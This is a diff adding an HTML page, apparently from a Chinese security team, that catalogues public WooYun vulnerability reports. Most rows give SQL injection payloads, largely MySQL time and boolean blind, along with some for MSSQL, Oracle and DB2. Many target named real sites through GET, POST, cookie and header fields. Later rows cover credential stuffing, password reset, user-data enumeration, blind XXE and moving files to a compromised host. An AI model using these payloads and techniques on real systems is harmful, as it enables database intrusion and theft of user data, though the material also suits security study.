@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">  
+    <title>PoC && EXP</title>
+    <meta name="description" content="">
+    <meta name="author" content="templatemo">
+    
+    <link href='http://fonts.useso.com/css?family=Open+Sans:400,300,400italic,700' rel='stylesheet' type='text/css'>
+    <link href="css/font-awesome.min.css" rel="stylesheet">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/templatemo-style.css" rel="stylesheet">
+    
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+      <script src="js/html5shiv.min.js"></script>
+      <script src="js/respond.min.js"></script>
+    <![endif]-->
+
+  </head>
+  <body>  
+    <!-- Left column -->
+    <div class="templatemo-flex-row">
+      <div class="templatemo-sidebar">
+        <header class="templatemo-site-header">
+          <div class="square"></div>
+          <h1>POC && EXP</h1>
+        </header>
+        <div class="profile-photo-container">
+          <img src="images/profile-photo.jpg" alt="Profile Photo" class="img-responsive">  
+          <div class="profile-photo-overlay"></div>
+        </div>      
+        <!-- Search box -->
+        <form class="templatemo-search-form" role="search">
+          <div class="input-group">
+              <button type="submit" class="fa fa-search"></button>
+              <input type="text" class="form-control" placeholder="Search" name="srch-term" id="srch-term">    
+          </div>
+        </form>
+        <div class="mobile-menu-icon">
+            <i class="fa fa-bars"></i>
+          </div>
+        <nav class="templatemo-left-nav">          
+          <ul>
+            
+            <li><a href="manage-users.html" class="active"><i class="fa fa-users fa-fw"></i>公开PoC及EXP分析</a></li>
+          </ul>  
+        </nav>
+      </div>
+      <!-- Main content --> 
+      <div class="templatemo-content col-1 light-gray-bg">
+        
+        <div class="templatemo-content-container">
+          <div class="templatemo-content-widget no-padding">
+            <div class="panel panel-default table-responsive">
+              <table class="table table-striped table-bordered templatemo-user-table">
+                <thead>
+                  <tr>
+                    <td><a href="" class="white-text templatemo-sort-by"> <span class="caret"></span></a></td>
+                    <td><a href="" class="white-text templatemo-sort-by">脚本编号<span class="caret"></span></a></td>
+                    <td><a href="" class="white-text templatemo-sort-by">注入类型 <span class="caret"></span></a></td>
+                    <td><a href="" class="white-text templatemo-sort-by">脚本特征 <span class="caret"></span></a></td>
+                    <td><a href="" class="white-text templatemo-sort-by">补充说明<span class="caret"></span></a></td>
+                    
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>1.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0126775</a></p></td> 
+                    <td>GET</td>
+                    <td>(ascii(mid(user()from(%s)for(1)))=%s,benchmark(2000000,md5(1)),0)</td>
+                    <td>if time.time() - t > 1.5</td>
+                  </tr>
+                   <tr>
+                    <td>2.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0120021</a></p></td> 
+                    <td>GET</td>
+                    <td>aaa'XOR(if(length(user())=20,sleep(3),0))OR'bbb  </td>
+                    <td>try： except:</td>
+                  </tr>
+				    <tr>
+                    <td>3.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0119102</a></p></td> 
+                    <td>GET/MySQL time blind</td>
+                    <td>(ascii(mid(user()from(%s)for(1)))=%s,benchmark(2000000,md5(1)),0)</td>
+                    <td>if(length(user())=22,sleep(2),0  <br> try： except: <br>同时，该脚本猜解user()，阀值设得很小，<br> 0.5秒超时</td>
+                  </tr>
+				    <tr>
+                    <td>4.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0118298</a></p></td> 
+                    <td>消息头中Host可注入</td>
+                    <td>GET / HTTP/1.1 <br>
+						Host: www.baidu.com'or(length(user())=14)or' <br>
+						Referer: http://dns-ch.xinnet.com<br> </td>  
+                    <td>if status == 302</td>
+                  </tr>
+				    <tr>
+                    <td>5.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0114907</a></p></td> 
+                    <td>GET</td>
+                    <td>if(ascii(mid(lower(user()),%s,1))=%s,benchmark(2000000,md5(1)),0) </td>
+                    <td>&nbsp&nbspif time.time() - start_time > 0.5:<br>
+						  &nbsp&nbsp&nbsp&nbsp timeout_count += 1<br>
+						&nbsp&nbspelse:<br>
+					      &nbsp&nbsp&nbsp&nbsp break<br>
+						  if timeout_count == 3:<br>
+						  &nbsp&nbsp&nbsp&nbsp&nbsp&nbspuser += payload</td>
+                  </tr>
+				   <tr>
+                    <td>6.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0114492</a></p></td> 
+                    <td>Cookie注入/MySQL bool blind</td>
+                    <td>GET /cart/mini_cart_ajax HTTP/1.1<br>
+						Cookie: PHPSESSID=c6798728910c94d53a88cd8369b8def5; <br>
+						csdn_cart_user_id=1"%20OR%20length(user())=23--%20;<br>
+			        </td>  
+                    <td>if len(html_doc) > 200:</td>
+                  </tr>
+				   <tr>
+                    <td>7.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0106276</a></p></td> 
+                    <td>POST</td>
+                    <td>aa'XOR(if(ascii(mid(lower(user()),%s,1))=%s,sleep(2),0))OR'bb </td>  
+                    <td>try: except: <br>if err_count == 3: </td>
+                  </tr>
+				   <tr>
+                    <td>8.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0105690</a></p></td> 
+                    <td>GET</td>
+                    <td>if(ascii(mid(lower(user()),%s,1))=%s,sleep(4),0)</td>  
+                    <td>try: except:</td>
+                  </tr>
+				   <tr>
+                    <td>9.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0104621</a></p></td> 
+                    <td>Cookie注入/MySQL bool blind</td>
+                    <td>GET /catering HTTP/1.1<br>
+			            Cookie: PHPSESSID=5dc8189e97e848e3bcab3381649061af; <br>SESSIONID=5dc8189e97e848e3bcab3381649061af;<br> CITY_ID=*; </td>  
+                    <td>if html_doc.find(u'/merchant/detail?storeid=2059629') > 0:</td>
+                  </tr>
+				    <tr>
+                    <td>10.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0103884</a></p></td> 
+                    <td>POST/MySQL bool blind</td>
+                    <td>aa'XOR(if(length(user())=17,sleep(6),0))OR'bb</td>
+					<td>当表达式为True时，延迟超过6秒。 为False，延迟一800ms左右 <br> try: except: </td>
+                  </tr>
+				    <tr>
+                    <td>11.</td>
+                    <td><a href="" target="_blank">wooyun-2010-0103670</a></p></td> 
+                    <td>POST</td>
+                    <td>123'xor(sleep(ascii(mid(lower(user()),%s,1))=%s))or #"123'xor(if(%s,sleep(5),0)or'" % s </td>  
+                    <td>try: except:</td>
+                  </tr>
+				   </tr>
+				    <tr>
+                    <td>12.</td>
+                    <td><a href="" target="_blank">wooyun-2010-095449</a></p></td> 
+                    <td>GET</td>
+                    <td>if(ascii(mid(lower(user()),%s,1))=%s,sleep(10),0)</td>  
+                    <td>try: except:</td>
+                  </tr>
+				   </tr>
+				    <tr>
+                    <td>13.</td>
+                    <td><a href="" target="_blank">wooyun-2010-095438</a></p></td> 
+                    <td>POST</td>
+                    <td>aa'XOR(if("ascii(mid(lower(user()),%s,1))=%s",sleep(5),0))OR'bb</td>  
+                    <td>try: except:</td>
+                  </tr>
+				   </tr>
+				    <tr>
+                    <td>14.</td>
+                    <td><a href="" target="_blank">wooyun-2010-095304</a></p></td> 
+                    <td>POST</td>
+                    <td>aa'XOR(if("ascii(mid(user(),%s,1))=%s",sleep(5),0))OR'bb</td>  
+                    <td>try: except:</td>
+                  </tr>
+				  </tr>
+				    <tr>
+                    <td>15.</td>
+                    <td><a href="" target="_blank">wooyun-2010-095083</a></p></td> 
+                    <td> GET/MySQL bool blind</td>
+                    <td>'XOR("ascii(mid(lower(user()),%s,1))=%s")OR'bb"</td>  
+                    <td>False对应的关键字：No matched winning logo designs</td>
+                  </tr>
+				   <tr>
+                    <td>16.</td>
+                    <td><a href="" target="_blank">wooyun-2010-094912</a></p></td> 
+                    <td>POST/bool blind</td>
+                    <td>and substring(lower(system_user),%s,1)>'%s</td>  
+                    <td>为True时页面加载缓慢，于是作为一个time blind示例猜解了system_user</td>
+                  </tr>
+				    <tr>
+                    <td>17.</td>
+                    <td><a href="" target="_blank">wooyun-2010-094880</a></p></td> 
+                    <td>GET/MySQL bool blind</td>
+                    <td>aa'XOR(if("mid(lower(user()),%s,1))=%s",1,0))OR'bb</td>  
+                    <td>False对应的关键字：No matched winning logo designs</td>
+                  </tr>
+				    <tr>
+                    <td>18.</td>
+                    <td><a href="" target="_blank">wooyun-2010-094603</a></p></td> 
+                    <td>GET</td>
+                    <td>/*'%2b(select(0)from(select(if("ascii(mid(user(),%s,1))=%s",sleep(5),0)))v)%2b'%22%2b(select(0)from(select(sleep(0)))v)%2b%22*/</td>  
+                    <td>&nbsp&nbspif time.time() - start_time > 5: <br> 
+					    &nbsp&nbsp&nbsp&nbsptimeout_count += 1 <br> 
+						&nbsp&nbsp&nbsp&nbspprint '*', <br> 
+						&nbsp&nbspelse: <br>
+						&nbsp&nbsp&nbsp&nbspbreak <br>
+						if timeout_count == 2:<br>
+						&nbsp&nbsp&nbspuser += payload</td>
+                  </tr>
+				    <tr>
+                    <td>19.</td>
+                    <td><a href="" target="_blank">wooyun-2010-094467</a></p></td> 
+                    <td>POST/MySQL bool blind</td>
+                    <td>'aa"XOR(if(ascii(mid(user()from(%s)for(1)))=%s,1,0))OR"bb</td>  
+                    <td>出现“请输入新密码”时为True</td>
+                  </tr>
+				    <tr>
+                    <td>20.</td>
+                    <td><a href="" target="_blank">wooyun-2010-092463</a></p></td> 
+                    <td>POST</td>
+                    <td>%%' and ascii(substr(lower(user),%s,1))=%s and '%%'='</td>  
+                    <td>IBM DB2数据库</td>
+                  </tr>
+				    <tr>
+                    <td>21.</td>
+                    <td><a href="" target="_blank">wooyun-2010-090164</a></p></td> 
+                    <td>GET</td>
+                    <td>%s"XOR(sleep(ascii(mid(lower(user())from(%s)for(1)))=%s))OR"bb' % (random.random(), i, ord(payload))</td>  
+                    <td></td>
+                  </tr>
+				    <tr>
+                    <td>22.</td>
+                    <td><a href="" target="_blank">wooyun-2010-089831</a></p></td> 
+                    <td>POST/MySQL bool blind</td>
+                    <td>1 or ascii(mid(lower(user())from(%s)for(1)))=%s</td>  
+                    <td>if html_doc != '0,0,0,0,0,0,0,0,0,0':  # True</td>
+                  </tr>
+				    <tr>
+                    <td>23.</td>
+                    <td><a href="" target="_blank">wooyun-2010-089924</a></p></td> 
+                    <td>GET</td>
+                    <td>/aaa'XOR(if(ascii(mid(user()from(%s)for(1)))=%s,sleep(3),3))OR'bb/</td>  
+                    <td>注入格式:http://m.soccer.sina.com.hk/t/注入语句</td>
+                  </tr>
+				    <tr>
+                    <td>24.</td>
+                    <td><a href="" target="_blank">wooyun-2010-089917</a></p></td> 
+                    <td>POST</td>
+                    <td>aa"XOR(if(ascii(mid(lower(user())from(%s)for(1)))=%s,sleep(3),0))OR"bb</td>  
+                    <td>try: except: <br> if timeout_count == 3:</td>
+                  </tr>
+				    <tr>
+                    <td>25.</td>
+                    <td><a href="" target="_blank">wooyun-2010-089826</a></p></td> 
+                    <td>GET</td>
+                    <td>if(ascii(mid(user()from(%s)for(1)))=%s,sleep(1),3)</td>  
+                    <td></td>
+                  </tr>
+				    <tr>
+                    <td>26.</td>
+                    <td><a href="" target="_blank">wooyun-2010-089469</a></p></td> 
+                    <td>GET/</td>
+                    <td>http://zhidao.baidu.com/c/ah189 and mid(lower(database()),1,1)="c" and "1"="1</td>  
+                    <td>if html_doc.find(u'安徽电信企业平台_企业知道_百度知道') > 0:</td>
+                  </tr>
+				    <tr>
+                    <td>27.</td>
+                    <td><a href="" target="_blank">wooyun-2010-089304</a></p></td> 
+                    <td>POST</td>
+                    <td>123'XOR(if(ascii(mid(lower(user())from(%s)for(1)))=%s,sleep(5),0))OR'bbb</td>  
+                    <td>raise Exception('oooooooops')<br> POST数据中sid每次需要重新获取 <br>经典绕过</td>
+                  </tr>
+				    <tr>
+                    <td>28.</td>
+                    <td><a href="" target="_blank">wooyun-2010-088834</a></p></td> 
+                    <td>GET</td>
+                    <td>if (ascii(substring(system_user,%s,1))=%s) waitfor delay '0:0:3' --</td>  
+                    <td></td>
+                  </tr>
+				    <tr>
+                    <td>29.</td>
+                    <td><a href="" target="_blank">wooyun-2010-088750</a></p></td> 
+                    <td>POST</td>
+                    <td>if(ascii(mid(lower(user())from(%s)for(1)))=%s,sleep(3),0)</td>  
+                    <td></td>
+                  </tr>
+				    <tr>
+                    <td>30.</td>
+                    <td><a href="" target="_blank">wooyun-2010-088431</a></p></td> 
+                    <td>GET</td>
+                    <td>123'XOR(if(ascii(mid(lower(user())from(%s)for(1)))=%s,sleep(5),0))OR'bbb</td>  
+                    <td></td>
+                  </tr>
+				   <tr>
+                    <td>31.</td>
+                    <td><a href="" target="_blank">wooyun-2010-088294</a></p></td> 
+                    <td>POST/Oracle bool blind</td>
+                    <td> ' OR ascii(substr(SYS_CONTEXT('USERENV','CURRENT_USER'),%s,1))=%s AND 1=1 --</td>  
+                    <td>current_user长度为5&nbsp&nbspOracle数据库</td>
+                  </tr>
+				   <tr>
+                    <td>32.</td>
+                    <td><a href="" target="_blank">wooyun-2010-088037</a></p></td> 
+                    <td>Cookie注入/Mysql bool blind</td>
+                    <td>' OR ascii(mid(database(),%s,1))=%s AND 1=1 -- </td>  
+                    <td>表达式为True时，页面返回302；为false，返回200 <br> Cookie中BAIDUID可注入</td>
+                  </tr>
+				   <tr>
+                    <td>33.</td>
+                    <td><a href="" target="_blank">wooyun-2010-087980</a></p></td> 
+                    <td>消息头中Referer可注入</td>
+                    <td>str(random.random()) + "aaa'XOR(if(ascii(mid(user(),%s,1))=%s,sleep(1),0))OR'bbb"</td>  
+                    <td>  GET / HTTP/1.1 <br> Referer: aaa*  </td>
+                  </tr>
+				   <tr>
+                    <td>34.</td>
+                    <td><a href="" target="_blank">wooyun-2010-087825</a></p></td> 
+                    <td>GET</td>
+                    <td>'XOR(if(ascii(mid(user(),%s,1))=%s,sleep(2),0))OR'bbb</td>  
+                    <td>程序如果误报，是因陷入的线程太多，数据库不稳定 <br> try: except: </td>
+                  </tr>
+				   <tr>
+                    <td>35.</td>
+                    <td><a href="" target="_blank">wooyun-2010-087531</a></p></td> 
+                    <td>GET/MySQL bool blind</td>
+					<td>(ascii(mid(user(),%s,1))=%s)</td>
+                    <td>为True时，页面有显示照片的div class="upload_one"</td>  
+                    
+                  </tr>
+				   <tr>
+                    <td>36.</td>
+                    <td><a href="" target="_blank">wooyun-2010-087520</a></p></td> 
+                    <td>GET</td>
+                    <td>"%saa'+(select(0)from(select(sleep(if(ascii(mid(user(),%s,1))=%s,5,0))))v)+'bb" % (rand_num, i, ord(payload))</td>  
+                    <td>&nbsp&nbspif resp.status == 502: <br>
+						&nbsp&nbsp&nbsp&nbsp&nbspraise Exception('ooooooooops') <br>
+						&nbsp&nbsp&nbsp&nbsp&nbspprint '.',  <br>
+					   &nbspexcept Exception, e: <br>
+						&nbsp&nbsp&nbsp&nbspuser += payload</td>
+                  </tr>
+				   <tr>
+                    <td>37.</td>
+                    <td><a href="" target="_blank">wooyun-2010-086762</a></p></td> 
+                    <td>GET</td>
+                    <td>if(ascii(mid(user(),%s,1))=%s,sleep(1),0)</td>  
+                    <td></td>
+                  </tr>
+				   <tr>
+                    <td>38.</td>
+                    <td><a href="" target="_blank">wooyun-2010-086516</a></p></td> 
+                    <td>GET</td>
+                    <td>sleep(1-abs(sign(ascii(mid(lower(user())from(%s)for(1)))-%s)))</td>  
+                    <td>不带等号注入<br>
+					通过sleep函数来猜解单个字符<br>
+					每次取一个字符的ascii码,与列表中的ascii码逐一对比,取符号的绝对值<br>
+					如果相等此时为True，则符号是0，绝对值是0，会延迟<br>
+			        若不等，则符号是1或-1，绝对值为1，不延迟<br>
+					</td>
+                  </tr>
+				    <tr>
+                    <td>39.</td>
+                    <td><a href="" target="_blank">wooyun-2010-086372</a></p></td> 
+                    <td>GET/Mysql bool blind</td>
+                    <td>" AND ascii(mid(lower(user())from(%s)for(1)))=%s AND "123"="123</td>  
+                    <td>if html_doc.find(u'搜索时间</dl>') > 0:</td>
+                  </tr>
+				    <tr>
+                    <td>40.</td>
+                    <td><a href="" target="_blank">wooyun-2010-084379</a></p></td> 
+                    <td>GET</td>
+                    <td>if(ascii(mid(user(),%s,1))=%s,sleep(1),0)</td>  
+                    <td>猜到10的时候，MySQL Server已经挂了，不再深入</td>
+                  </tr>
+				     <tr>
+                    <td>41.</td>
+                    <td><a href="" target="_blank">wooyun-2010-084801</a></p></td> 
+                    <td>GET</td>
+                    <td> sleep(ascii(mid(lower(user())from(%s)for(1)))=%s) </td>  
+                    <td>页面有检查Referer，测试时需设定</td>
+                  </tr>
+				     <tr>
+                    <td>42.</td>
+                    <td><a href="" target="_blank">wooyun-2010-083899</a></p></td> 
+                    <td>GET/MySQL bool blind</td>
+                    <td>??</td>  
+                    <td>出现韩都衣舍时为True</td>
+                  </tr>
+				     <tr>
+                    <td>43.</td>
+                    <td><a href="" target="_blank">wooyun-2010-083813</a></p></td> 
+                    <td>消息头中X-Forwarded-For可注入/MSSQL</td>
+                    <td>str(random.random()) + "127.0.0.1'); if (ascii(substring(@@version,%s,1))=%s) waitfor delay '0:0:3' -- "</td>  
+                    <td>X-Forwarded-For: 127.0.0.1'); waitfor delay '0:0:1' -- <br>当前用户sa&nbsp&nbsp尝试查找SQL Server Version</td>
+                  </tr>
+				     <tr>
+                    <td>44.</td>
+                    <td><a href="" target="_blank">wooyun-2010-083715</a></p></td> 
+                    <td>GET/MySQL Bool blind</td>
+                    <td>AND ascii(mid(user()from(%s)for(1)))=%s AND 'aaa'='aaa</td>  
+                    <td>一个比较隐蔽的注射点 第一眼看网页可能没有什么分别 <br> 
+			            右键查看源代码，可以发现第757行的内容不一样。Bool blind 出现“城北”为True</td>
+                    </tr>
+					 <tr>
+                    <td>45.</td>
+                    <td><a href="" target="_blank">wooyun-2010-083376</a></p></td> 
+                    <td>MySQL time-based blind/MySQL bool blind</td>
+                    <td> and ascii(mid(user()from(%s)for(1)))=%s and '1'='1</td>  
+                    <td>测试基于时间的盲注，大约10个sleep陷入，带参数的页面就全挂了 <br>
+			            最后使用了bool的MySQL注射</td>
+                    </tr>
+				    <tr>
+                    <td>46.</td>
+                    <td><a href="" target="_blank">wooyun-2010-083257</a></p></td> 
+                    <td>POST(经典)</td>
+                    <td>sleep(ascii(mid(user()from(%s)for(1)))=%s)</td>  
+                    <td>后端不稳定，有一定的几率会出现404，因此把http Request的检查写到单独的函数中<br>404不管，只顾200和502<br> 
+			            这里有个小技巧:一个sleep(1=1)，后端是不一定502 time out的<br>因此我是把3个sleep相加，这样就可以保证后端一定会502</td>
+                    </tr>
+					 <tr>
+                    <td>47.</td>
+                    <td><a href="" target="_blank">wooyun-2010-082740</a></p></td> 
+                    <td>GET</td>
+                    <td>'XOR(if(ascii(mid(user(),%s,1))=%s,sleep(4),0))OR'bbb</td>  
+                    <td></td>
+                    </tr>
+					<tr>
+                    <td>48.</td>
+                    <td><a href="" target="_blank">wooyun-2010-083899</a></p></td> 
+                    <td>GET</td>
+                    <td>if (ascii(substring(@@version,%s,1))=%s) waitfor delay '0:0:5' --</td>  
+                    <td>MSSQL 脚本将获得SQL Server Version</td>
+                    </tr>
+					 <tr>
+                    <td>49.</td>
+                    <td><a href="" target="_blank">wooyun-2010-082690</a></p></td> 
+                    <td>GET</td>
+                    <td>'XOR(if(ascii(mid(user(),%s,1))=%s,sleep(4),0))OR'bbb</td>  
+                    <td></td>
+                    </tr>
+					 <tr>
+                    <td>50.</td>
+                    <td><a href="" target="_blank">wooyun-2010-082564</a></p></td> 
+                    <td>POST/MySQL bool blind</td>
+                    <td>AND ascii(substr(SYS_CONTEXT('USERENV','CURRENT_USER'),%s,1))=%s--</td>  
+                    <td>如果页面返回到达地“广州”，表示True</td>
+                    </tr>
+					 <tr>
+                    <td>51.</td>
+                    <td><a href="" target="_blank">wooyun-2010-081949</a></p></td> 
+                    <td>GET(经典绕过)</td>
+                    <td>sleep(ascii(mid(user()from(%s)for(1)))=%s)</td>  
+                    <td>联想（公司）二次开发引入的Discuz注入，ThinkPad论坛，部分SQL关键字又被过滤了，比如select，因此报错注入的利用有限制</td>
+                    </tr>
+					 <tr>
+                    <td>52.</td>
+                    <td><a href="" target="_blank">wooyun-2010-081844</a></p></td> 
+                    <td>Cookie注入</td>
+                    <td>if (ascii(substring(@@version,%s,1))=%s) waitfor delay '0:0:5' --</td>  
+                    <td>MSSQL数据库&nbsp&nbspSQL Server version is Microsoft SQL Server 2008 SP</td>
+                    </tr>
+					 <tr>
+                    <td>53.</td>
+                    <td><a href="" target="_blank">wooyun-2010-081815</a></p></td> 
+                    <td>POST</td>
+                    <td>if (ascii(substring(@@version,%s,1))=%s) waitfor delay '0:0:5' --</td>  
+                    <td>MSSQL数据库,脚本将得到数据库版本</td>
+                    </tr>
+					<tr>
+                    <td>55.</td>
+                    <td><a href="" target="_blank">wooyun-2010-079379</a></p></td> 
+                    <td>GET</td>
+                    <td>(sleep(ascii(mid(user()from(%s)for(1)))=%s)) </td>  
+                    <td>不带空格和逗号即可注入</td>
+                    </tr>
+					<tr>
+                    <td>56.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0137143</a></p></td> 
+                    <td>XML二次爆破DoS攻击漏洞</td>
+                    <td> </td>  
+                    <td>POST提交POC</td>
+                    </tr>
+					<tr>
+					<td>57.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0100000</a></p></td> 
+                    <td>撞库攻击</td>
+                    <td>碰撞方式获取大量PNR码</td>  
+                    <td></td>
+                    </tr>
+					<tr>
+					<td>58.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0109422</a></p></td> 
+                    <td>任意用户密码重置脚本</td>
+                    <td>密码格式：$md5=md5(time().rand(0,100)); $md5='lock'.substr($md5,5,strlen($md5));</td>  
+                    <td></td>
+                    </tr>
+					<tr>
+					<td>59.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0119851</a></p></td> 
+                    <td>撞库攻击</td>
+                    <td>利用burpsuite进行抓包后发现，userID为纯数字，oldPwd可暴力破解，故重置用户密码</td>  
+                    <td></td>
+                    </tr>
+					<tr>
+					<td>60.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0126008</a></p></td> 
+                    <td>查询任意用户信息脚本</td>
+                    <td>查看源代码发现，用户的用户名，邮箱，id，电话信息出现在隐藏表单里面</td>  
+                    <td></td>
+                    </tr>
+					<tr>
+					<td>61.</td>
+                    <td><a href="" target="_blank">wooyun-2016-0172227</a></p></td> 
+                    <td>简单套接字传文件脚本</td>
+                    <td>把send.py传到肉鸡上，recv.py传到vps上</td>  
+                    <td>渗透需要思路</td>
+                    </tr>
+					<tr>
+					<td>62.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0120222</a></p></td> 
+                    <td>读取IOS BinaryCookies的脚本</td>
+                    <td>尝试使用获得的cookie进行越权操作</td>  
+                    <td></td>
+                    </tr>
+					<tr>
+					<td>63.</td>
+                    <td><a href="" target="_blank">wooyun-2014-088964</a></p></td> 
+                    <td>撞库攻击</td>
+                    <td>name=用户名&pass=密码MD5 Hash&action=login</td>  
+                    <td></td>
+                    </tr>
+					<tr>
+					<td>64.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0135483</a></p></td> 
+                    <td>查询任意用户信息脚本</td>
+                    <td>利用接口查询任意用户信息</td>  
+                    <td></td>
+                    </tr>
+					<tr>
+					<td>65.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0145012</a></p></td> 
+                    <td>撞库攻击</td>
+                    <td>企业邮箱一处设计缺陷导致撞库攻击</td>  
+                    <td></td>
+                    </tr>
+					<tr>
+					<td>66.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0105251</a></p></td> 
+                    <td>利用接口查询任意用户信息</td>
+                    <td></td>  
+                    <td>提交方式：urllib2.urlopen(req, data="<?print(md5(0x22))?>")</td>
+                    </tr>
+					<tr>
+					<td>67.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0135615</a></p></td> 
+					<td>Blind XXE</td>
+                    <td>访问http://**.**.**.**/kv?act=set&k={key}&v={value} 可以在远程主机设置一个键值对</td>
+                    <td>http://**.**.**.**/kv?act=get&k=刚刚的key 可以查看是否设置了这个键值对，以此进行漏洞的验证</td>  
+                    </tr>
+					<tr>
+					<td>68.</td>
+                    <td><a href="" target="_blank">wooyun-2015-0135356</a></p></td> 
+                    <td>Blind XXE</td>
+                    <td>没有安全使用simplexml_load_string导致xxe</td>  
+                    <td></td>
+                    </tr>
+					
+					
+					
+					
+				  
+				  
+				  
+				  
+				  
+				   
+				  
+                </tbody>
+              </table>    
+            </div>                          
+          </div>          
+          
+         
+          <footer class="text-right">
+            <p>Copyright © Wind Punish（风惩）网络安全团队</a></p>
+          </footer>         
+        </div>
+      </div>
+    </div>
+    
+    <!-- JS -->
+    <script type="text/javascript" src="js/jquery-1.11.2.min.js"></script>      <!-- jQuery -->
+    <script type="text/javascript" src="js/templatemo-script.js"></script>      <!-- Templatemo Script -->
+    <script>
+      $(document).ready(function(){
+        // Content widget with background image
+        var imageUrl = $('img.content-bg-img').attr('src');
+        $('.templatemo-content-img-bg').css('background-image', 'url(' + imageUrl + ')');
+        $('img.content-bg-img').hide();        
+      });
+    </script>
+  </body>
+</html>
